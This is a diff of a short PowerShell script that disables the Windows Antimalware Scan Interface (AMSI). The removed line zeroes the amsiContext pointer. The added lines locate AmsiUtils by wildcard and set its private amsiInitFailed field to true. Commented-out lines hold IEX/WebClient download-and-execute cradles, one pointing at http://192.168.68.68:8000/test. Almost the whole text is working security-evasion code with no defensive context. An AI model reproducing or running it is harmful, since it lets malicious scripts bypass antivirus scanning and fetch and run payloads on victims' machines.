@@ -1,1 +1,19 @@
-$a=[Ref].Assembly.GetTypes(); Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}; $d=$c.GetFields('NonPublic,Static'); Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}}; $g=$f.GetValue($null); [IntPtr]$ptr=$g; [Int32[]]$buf=@(0); [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+$ExecutionContext.SessionState.LanguageMode;
+
+$a=[Ref].Assembly.GetTypes(); 
+
+#[System.Net.WebRequest]::DefaultWebProxy.GetProxy("https://raw.githubusercontent.com/Alium-Realis/HelloWrld/main/README.md");
+
+#$wc = new-object System.Net.WebClient;
+#$wc.proxy = $null;
+
+Foreach($z in $a) {if ($z.Name -like "*iUtils") {$c=$z}};
+
+#IEX(New-Object System.Net.WebClient).DownloadString("D:\d-test\amlite.txt");
+
+$d = $c.GetFields('NonPublic,Static');
+Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}}; 
+
+#$wc.DownloadString("http://192.168.68.68:8000/test");
+
+$f.SetValue($null,$true); 
